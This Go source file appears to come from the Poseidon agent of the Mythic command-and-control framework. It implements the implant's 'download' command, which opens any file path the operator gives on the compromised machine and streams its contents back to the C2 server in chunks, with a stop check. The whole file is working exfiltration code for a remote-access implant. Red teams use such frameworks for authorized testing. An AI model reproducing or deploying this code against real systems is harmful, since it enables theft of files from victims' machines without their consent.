package download

import (
	// Standard
	"fmt"
	"os"
	"path/filepath"
	"time"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// Run - Function that executes the shell command
func Run(task structs.Task) {
	//File download
	path := task.Params
	// Get the file size first and then the # of chunks required
	fullPath, err := filepath.Abs(path)
	if err != nil {
		msg := task.NewResponse()
		msg.SetError(fmt.Sprintf("Error opening file: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	file, err := os.Open(fullPath)
	if err != nil {
		msg := task.NewResponse()
		msg.SetError(fmt.Sprintf("Error opening file: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	fi, err := file.Stat()
	if err != nil {
		msg := task.NewResponse()
		msg.SetError(fmt.Sprintf("Error getting file size: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}
	downloadMsg := structs.SendFileToMythicStruct{}
	downloadMsg.Task = &task
	downloadMsg.IsScreenshot = false
	downloadMsg.SendUserStatusUpdates = true
	downloadMsg.File = file
	downloadMsg.FileName = fi.Name()
	downloadMsg.FullPath = fullPath
	downloadMsg.FinishedTransfer = make(chan int, 2)
	task.Job.SendFileToMythic <- downloadMsg
	for {
		select {
		case <-downloadMsg.FinishedTransfer:
			msg := task.NewResponse()
			msg.Completed = true
			msg.UserOutput = "Finished Downloading"
			task.Job.SendResponses <- msg
			return
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				msg := task.NewResponse()
				msg.SetError("Tasked to stop early")
				task.Job.SendResponses <- msg
				return
			}
		}
	}
}
